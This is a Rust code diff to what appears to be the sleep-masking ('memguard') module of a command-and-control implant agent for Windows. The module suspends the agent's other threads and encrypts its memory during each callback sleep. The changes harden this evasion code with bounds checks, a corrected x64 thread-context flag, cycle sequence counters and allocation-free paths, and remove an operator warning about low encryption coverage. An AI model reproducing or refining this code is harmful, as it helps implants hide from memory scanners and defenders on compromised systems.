@@ -32,10 +32,10 @@
 
 use core::ffi::c_void;
 use std::sync::OnceLock;
-use std::sync::atomic::{AtomicBool, AtomicPtr, AtomicU64, Ordering};
+use std::sync::atomic::{AtomicPtr, AtomicU64, Ordering};
 use std::thread;
 
-use windows_sys::Win32::Foundation::CloseHandle;
+use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
 use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
@@ -64,7 +64,11 @@ const DORMANCY_BACKOFF_MS: u64 = 5;
 const DECRYPT_MAX_ATTEMPTS: usize = 30;
 const PAGE_SIZE: usize = 4096;
 const TLS_EXPANSION_SLOTS_OFFSET: usize = 0x1780;
-const CONTEXT_CONTROL: u32 = 0x1;
+// CONTEXT_CONTROL for x64: CONTEXT_CONTROL (0x1) ORed with the CONTEXT_AMD64
+// (0x0010_0000) selector bit. Using only 0x1 is the legacy x86 value and makes
+// GetThreadContext return an incomplete/zeroed control context on x64, so the
+// Rip re-verify reads garbage.
+const CONTEXT_CONTROL: u32 = 0x0010_0001;
 const THREAD_BASIC_INFORMATION_CLASS: u32 = 0;
 const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
 const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
@@ -182,13 +186,18 @@ const INFINITE: u32 = 0xFFFFFFFF;
 static WAKE_EVENT: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
 static CMD_EVENT: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
 static INTERVAL_BITS: AtomicU64 = AtomicU64::new(0);
+// Monotonic cycle sequence counters. The agent increments CMD_SEQ when it submits
+// a command; the watchdog increments DONE_SEQ after each cycle completes (after
+// resume + wake). The park loop only treats a WAKE as a real wake for THIS cycle
+// when DONE_SEQ == the agent's submit sequence, which prevents a latched WAKE
+// left over from a still-active previous cycle from releasing the next park in
+// 0 ms mid-cycle.
+static CMD_SEQ: AtomicU64 = AtomicU64::new(0);
+static DONE_SEQ: AtomicU64 = AtomicU64::new(0);
 // Liveness of the watchdog thread: `true` once it has been spawned (events
 // created + thread launched), `false` if init failed. `engage_memguard_sleep`
 // falls back to plain `tokio::time::sleep` when this is `false`.
 static WATCHDOG_SPAWNED: OnceLock<bool> = OnceLock::new();
-// One-time guard so the low-interval coverage warning fires exactly once per
-// process (visibility only; it never changes behavior).
-static WARNED_LOW_INTERVAL: AtomicBool = AtomicBool::new(false);
 
 /// Minimum effective sleep (seconds) required before the watchdog encrypt path
 /// engages. Overridable at watchdog init via `IMIX_MEMGUARD_MIN_SECS`.
@@ -257,13 +266,7 @@ pub async fn engage_memguard_sleep(interval_secs: f64) -> bool {
         trace_line("agent-fallback", format_args!("reason=no-events"));
         return false;
     }
-    // Publish the interval (as f64 bits) and pulse the command Event. This is the
-    // "send": the watchdog is parked on CMD_EVENT and wakes to read INTERVAL_BITS.
-    INTERVAL_BITS.store(interval_secs.to_bits(), Ordering::Release);
     trace_line("agent-cmd-sent", format_args!("interval={interval_secs}"));
-    unsafe {
-        let _ = SetEvent(cmd);
-    }
     // Park the async worker on a blocking-pool thread. The wait is a kernel Event
     // wait in 1-second slices that SELF-EXPIRES: if the wake is lost, or the
     // wait-return faults in a context the VEH cannot recover (a known partial-
@@ -272,23 +275,41 @@ pub async fn engage_memguard_sleep(interval_secs: f64) -> bool {
     // lost wake therefore becomes a benign one-cycle timing hiccup instead of a
     // permanent hang. Each 1s timeout slice emits `agent-park-tick` so the VM
     // round can see whether the wake actually arrives. The closure reads the wake
-    // Event from the `.data` static and captures only the interval (a Send f64),
-    // so it stays `Send`.
+    // Event from the `.data` static and captures only the interval plus the cmd
+    // Event pointer (both Send), so it stays `Send`.
     trace_line(
         "agent-before-park",
         format_args!("interval={interval_secs}"),
     );
-    let park_interval = interval_secs;
     let recv = tokio::task::spawn_blocking(move || {
+        // Publish the interval and pulse the command Event from inside the
+        // blocking thread, immediately before its wait. Doing this here (rather
+        // than on the async worker before spawn) removes the startup race where
+        // the watchdog could park on CMD_EVENT and enter dormancy before the
+        // agent had written INTERVAL_BITS.
+        INTERVAL_BITS.store(interval_secs.to_bits(), Ordering::Release);
+        let _ = unsafe { SetEvent(CMD_EVENT.load(Ordering::Acquire)) };
+        // Claim a monotonic submit sequence so the park loop can distinguish a
+        // genuine wake for THIS cycle from a latched WAKE left by a still-active
+        // previous cycle.
+        let my_seq = CMD_SEQ.fetch_add(1, Ordering::Release) + 1;
         let start = unsafe { GetTickCount64() };
-        let deadline_ms = (park_interval * 1000.0) as u64 + 2000;
+        let park_ms = if interval_secs.is_finite() {
+            (interval_secs * 1000.0) as u64
+        } else {
+            0
+        };
+        let deadline_ms = park_ms.saturating_add(2000);
         let mut woke = false;
         loop {
             let waited = unsafe { WaitForSingleObject(WAKE_EVENT.load(Ordering::Acquire), 1000) };
             if waited == 0 {
-                // WAIT_OBJECT_0: the watchdog pulsed WAKE_EVENT.
-                woke = true;
-                break;
+                // A real wake for this cycle carries DONE_SEQ == my_seq; a latched
+                // wake from a prior cycle does not, so ignore it and keep waiting.
+                if DONE_SEQ.load(Ordering::Acquire) == my_seq {
+                    woke = true;
+                    break;
+                }
             }
             // WAIT_TIMEOUT (or an unexpected code): emit a tick and keep waiting
             // until the self-expire deadline.
@@ -357,20 +378,6 @@ fn watchdog_main(ntdll: (usize, usize)) {
             let _ = WaitForSingleObject(cmd, INFINITE);
         }
         let interval_secs = f64::from_bits(INTERVAL_BITS.load(Ordering::Acquire));
-        // Visibility only: if the configured callback interval is at/below the
-        // effective engage threshold (MIN plus per-cycle callback duration) memory
-        // encryption will rarely or never engage, and the only prior signal was a
-        // print_debug-gated trace line — an operator would get zero coverage
-        // invisibly. Warn exactly once.
-        if interval_secs < MIN_ENCRYPT_INTERVAL_SECS + 3.0
-            && !WARNED_LOW_INTERVAL.swap(true, Ordering::AcqRel)
-        {
-            log::warn!(
-                "memguard: callback interval {:.1}s is at/below the effective encryption threshold (min {:.1}s plus per-cycle callback duration); memory encryption will rarely or never engage - increase the callback interval",
-                interval_secs,
-                MIN_ENCRYPT_INTERVAL_SECS
-            );
-        }
         let ntqit = match ntqit {
             Some(f) => f,
             None => {
@@ -444,6 +451,11 @@ fn watchdog_main(ntdll: (usize, usize)) {
                 ensure_decrypted(g);
             }
         }
+        // Mark this cycle complete (with the monotonic sequence) BEFORE pulsing
+        // the wake, so the agent's DONE_SEQ check can never observe the wake
+        // without the matching sequence (which would otherwise ignore a real
+        // wake and hang until the self-expire deadline).
+        DONE_SEQ.fetch_add(1, Ordering::Release);
         if !wake.is_null() {
             unsafe {
                 let _ = SetEvent(wake);
@@ -453,7 +465,7 @@ fn watchdog_main(ntdll: (usize, usize)) {
 }
 
 fn plain_sleep(secs: f64) {
-    if secs <= 0.0 {
+    if secs <= 0.0 || !secs.is_finite() {
         return;
     }
     // Slice-saturate: a single Sleep() is capped at u32::MAX ms (~49.7 days). For
@@ -572,7 +584,12 @@ struct SpiLayout {
 /// STATUS_INFO_LENGTH_MISMATCH. Allocation is fine here: this runs before the
 /// encrypted window opens and the `Vec` is dropped before `encrypt()`.
 fn query_raw(ntqsi: NtQuerySystemInformationFn) -> Option<Vec<u8>> {
+    // Cap the buffer at 64 MiB so a misbehaving/garbage syscall cannot make us
+    // allocate unbounded memory, and bound the number of retries.
+    const MAX_BUF_LEN: usize = 64 * 1024 * 1024;
+    const MAX_RETRIES: usize = 32;
     let mut buf_len = 0x40000usize;
+    let mut retries = 0usize;
     let mut buf: Vec<u8> = Vec::with_capacity(buf_len);
     loop {
         buf.resize(buf_len, 0);
@@ -589,31 +606,59 @@ fn query_raw(ntqsi: NtQuerySystemInformationFn) -> Option<Vec<u8>> {
             return Some(buf);
         }
         if status == STATUS_INFO_LENGTH_MISMATCH {
-            buf_len = buf_len.saturating_mul(2);
+            let hint = if return_length > 0 {
+                return_length as usize
+            } else {
+                buf_len
+            };
+            buf_len = hint.saturating_mul(2).min(MAX_BUF_LEN);
+            retries += 1;
+            if retries > MAX_RETRIES || buf_len == 0 {
+                return None;
+            }
             continue;
         }
         return None;
     }
 }
 
-/// Parse the (tid, ThreadState) pairs for `self_pid` using the calibrated layout.
-fn parse_threads_at(base: *const u8, self_pid: u32, layout: &SpiLayout) -> Option<Vec<(u32, u32)>> {
+// Parse the (tid, ThreadState) pairs for `self_pid` using the calibrated
+// layout. Takes the whole snapshot buffer so EVERY read offset and every
+// NextEntryOffset step can be validated against `buf.len()` before dereferencing;
+// a malformed buffer can therefore never be read out of bounds.
+fn parse_threads_at(buf: &[u8], self_pid: u32, layout: &SpiLayout) -> Option<Vec<(u32, u32)>> {
+    let base = buf.as_ptr();
+    let len = buf.len();
     let mut out: Vec<(u32, u32)> = Vec::new();
     let mut offset: usize = 0;
     loop {
+        // Every entry read must land within the snapshot buffer.
+        if offset + 8 > len {
+            return None;
+        }
         let entry = unsafe { base.add(offset) };
         let next = unsafe { core::ptr::read_unaligned(entry.add(0x00) as *const u32) } as usize;
+        if layout.pid_offset + 8 > len || offset + layout.pid_offset + 8 > len {
+            return None;
+        }
         let pid =
             unsafe { core::ptr::read_unaligned(entry.add(layout.pid_offset) as *const usize) };
         let num_threads =
             unsafe { core::ptr::read_unaligned(entry.add(0x04) as *const u32) } as usize;
         if pid == self_pid as usize {
+            if num_threads == 0 {
+                return Some(out);
+            }
             if num_threads > 0x2000 {
                 return None;
             }
-            let threads_base = unsafe { entry.add(layout.threads_offset) };
+            let threads_base_off = offset + layout.threads_offset;
             for i in 0..num_threads {
-                let t = unsafe { threads_base.add(i * THREAD_ENTRY_SIZE) };
+                let t_off = threads_base_off.checked_add(i * THREAD_ENTRY_SIZE)?;
+                if t_off + THREAD_ENTRY_SIZE > len {
+                    return None;
+                }
+                let t = unsafe { base.add(t_off) };
                 let tid =
                     unsafe { core::ptr::read_unaligned(t.add(THREAD_TID_OFFSET) as *const u32) };
                 let state =
@@ -625,7 +670,10 @@ fn parse_threads_at(base: *const u8, self_pid: u32, layout: &SpiLayout) -> Optio
         if next == 0 {
             break;
         }
-        offset = offset + next;
+        offset = offset.checked_add(next)?;
+        if offset >= len {
+            break;
+        }
     }
     None
 }
@@ -637,7 +685,7 @@ fn toolhelp_tids(self_tid: u32) -> Vec<u32> {
     let mut out: Vec<u32> = Vec::new();
     unsafe {
         let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-        if snap.is_null() {
+        if snap.is_null() || snap == INVALID_HANDLE_VALUE {
             return out;
         }
         let mut te: THREADENTRY32 = core::mem::zeroed();
@@ -684,13 +732,20 @@ fn calibrate_spi(
     let self_pid = unsafe { GetCurrentProcessId() };
     let buf = query_raw(ntqsi)?;
     let base = buf.as_ptr();
+    let len = buf.len();
     for pid_off in [0x40usize, 0x48, 0x50, 0x58] {
         for thr_off in (0x80usize..=0x180usize).step_by(8) {
             let mut offset: usize = 0;
             loop {
+                if offset + 8 > len {
+                    break;
+                }
                 let entry = unsafe { base.add(offset) };
                 let next =
                     unsafe { core::ptr::read_unaligned(entry.add(0x00) as *const u32) } as usize;
+                if pid_off + 8 > len || offset + pid_off + 8 > len {
+                    break;
+                }
                 let pid = unsafe { core::ptr::read_unaligned(entry.add(pid_off) as *const usize) };
                 let num =
                     unsafe { core::ptr::read_unaligned(entry.add(0x04) as *const u32) } as usize;
@@ -698,11 +753,22 @@ fn calibrate_spi(
                     if num > 0x2000 {
                         break;
                     }
-                    let tbase = unsafe { entry.add(thr_off) };
+                    let tbase_off = offset + thr_off;
                     let mut tids: Vec<u32> = Vec::with_capacity(num.min(0x2000));
                     let mut plausible = true;
                     for i in 0..num {
-                        let t = unsafe { tbase.add(i * THREAD_ENTRY_SIZE) };
+                        let t_off = match tbase_off.checked_add(i * THREAD_ENTRY_SIZE) {
+                            Some(v) => v,
+                            None => {
+                                plausible = false;
+                                break;
+                            }
+                        };
+                        if t_off + THREAD_ENTRY_SIZE > len {
+                            plausible = false;
+                            break;
+                        }
+                        let t = unsafe { base.add(t_off) };
                         let tid = unsafe {
                             core::ptr::read_unaligned(t.add(THREAD_TID_OFFSET) as *const u32)
                         };
@@ -729,7 +795,10 @@ fn calibrate_spi(
                 if next == 0 {
                     break;
                 }
-                offset = offset + next;
+                offset = offset.checked_add(next)?;
+                if offset >= len {
+                    break;
+                }
             }
         }
     }
@@ -742,7 +811,7 @@ fn query_process_threads(
     layout: &SpiLayout,
 ) -> Option<Vec<(u32, u32)>> {
     let buf = query_raw(ntqsi)?;
-    parse_threads_at(buf.as_ptr(), self_pid, layout)
+    parse_threads_at(&buf, self_pid, layout)
 }
 
 /// Fail-closed runtime validation of the system snapshot: the parsed thread count
@@ -803,7 +872,7 @@ fn enumerate_threads(
 
     let pid = unsafe { GetCurrentProcessId() };
     let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
-    if snap.is_null() {
+    if snap.is_null() || snap == INVALID_HANDLE_VALUE {
         return None;
     }
 
@@ -1252,10 +1321,15 @@ fn resume_all(slots: &mut [ThreadSlot]) {
 /// successful dormancy pass and here, the in-flight thread set is not what we
 /// just excluded around, so the caller must abort the cycle.
 fn thread_set_unchanged(self_tid: u32, slots: &[ThreadSlot]) -> bool {
-    let mut current: Vec<u32> = Vec::new();
+    // Fixed stack buffers: this runs while every other thread is suspended, so a
+    // Vec allocation here could deadlock on the allocator lock held by a
+    // suspended thread. No heap is touched on this path.
+    let mut cur = [0u32; MAX_THREADS];
+    let mut cur_count = 0usize;
+    let mut total = 0usize;
     unsafe {
         let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-        if snap.is_null() {
+        if snap.is_null() || snap == INVALID_HANDLE_VALUE {
             return false;
         }
         let mut te: THREADENTRY32 = core::mem::zeroed();
@@ -1272,19 +1346,30 @@ fn thread_set_unchanged(self_tid: u32, slots: &[ThreadSlot]) -> bool {
                 break;
             }
             if te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != self_tid {
-                current.push(te.th32ThreadID);
+                total += 1;
+                if cur_count < MAX_THREADS {
+                    cur[cur_count] = te.th32ThreadID;
+                    cur_count += 1;
+                }
             }
         }
         CloseHandle(snap);
     }
-    if current.len() != slots.len() {
+    if total != slots.len() {
         return false;
     }
-    let mut a = current;
-    let mut b: Vec<u32> = slots.iter().map(|s| s.tid).collect();
-    a.sort_unstable();
-    b.sort_unstable();
-    a == b
+    if cur_count != slots.len() {
+        return false;
+    }
+    let mut a = [0u32; MAX_THREADS];
+    let mut a_count = 0usize;
+    for s in slots.iter() {
+        a[a_count] = s.tid;
+        a_count += 1;
+    }
+    cur[..cur_count].sort_unstable();
+    a[..a_count].sort_unstable();
+    cur[..cur_count] == a[..a_count]
 }
 
 /// Decrypt until fully complete. Retries with backoff; if it still fails the
@@ -1435,7 +1520,6 @@ fn run_cycle(
     });
     let enc_elapsed = trace_now() - t0_enc;
     if !encrypt_ok {
-        emit_skip("encrypt failed");
         #[cfg(any(test, feature = "print_debug"))]
         {
             let mut diag = crate::memguard::engine::DecryptDiag::default();
@@ -1447,6 +1531,12 @@ fn run_cycle(
             ensure_decrypted(guard);
             set_stdout_safe(true);
         }
+        // Resume all suspended threads (the SlotsGuard would otherwise keep them
+        // suspended until the function returns, i.e. across the plain_sleep
+        // below) before emitting the skip and sleeping, so they are never left
+        // suspended during the sleep.
+        drop(slots);
+        emit_skip("encrypt failed");
         trace_line(
             "cycle-return",
             format_args!("skipped=true reason=encrypt-failed"),
@@ -2015,6 +2105,12 @@ mod tests {
         // Serialize with the other memguard tests which also own the singleton.
         let _g = crate::memguard::TEST_LOCK.lock().unwrap();
 
+        // Reset the spin-wait handshake statics so repeated runs (the test suite
+        // runs this test more than once) start from fresh state.
+        VEH_TEST_GO.store(false, Ordering::Release);
+        VEH_TEST_RES_A.store(0, Ordering::Release);
+        VEH_TEST_RES_B.store(0, Ordering::Release);
+
         let mut guard = MemGuard::new().expect("memguard init");
 
         // Two private RW pages to fault on (two distinct encrypted pages).
@@ -2054,8 +2150,8 @@ mod tests {
                 core::arch::asm!("mov {0}, gs:[0x30]", out(reg) t, options(nostack));
                 t
             };
-            let stack_base = unsafe { *(teb as *const u8).add(0x08) as *const *mut c_void };
-            let stack_limit = unsafe { *(teb as *const u8).add(0x10) as *const *mut c_void };
+            let stack_base = unsafe { *((teb as *const u8).add(0x08) as *const *mut c_void) };
+            let stack_limit = unsafe { *((teb as *const u8).add(0x10) as *const *mut c_void) };
             let _ = tx_a.send((teb, stack_base as usize, stack_limit as usize));
             // BUSY-spin (no kernel wait) on the go flag until the test thread
             // releases it AFTER encrypt(). Spinning keeps the thread Running (not
@@ -2077,8 +2173,8 @@ mod tests {
                 core::arch::asm!("mov {0}, gs:[0x30]", out(reg) t, options(nostack));
                 t
             };
-            let stack_base = unsafe { *(teb as *const u8).add(0x08) as *const *mut c_void };
-            let stack_limit = unsafe { *(teb as *const u8).add(0x10) as *const *mut c_void };
+            let stack_base = unsafe { *((teb as *const u8).add(0x08) as *const *mut c_void) };
+            let stack_limit = unsafe { *((teb as *const u8).add(0x10) as *const *mut c_void) };
             let _ = tx_b.send((teb, stack_base as usize, stack_limit as usize));
             while !VEH_TEST_GO.load(Ordering::Acquire) {
                 core::hint::spin_loop();
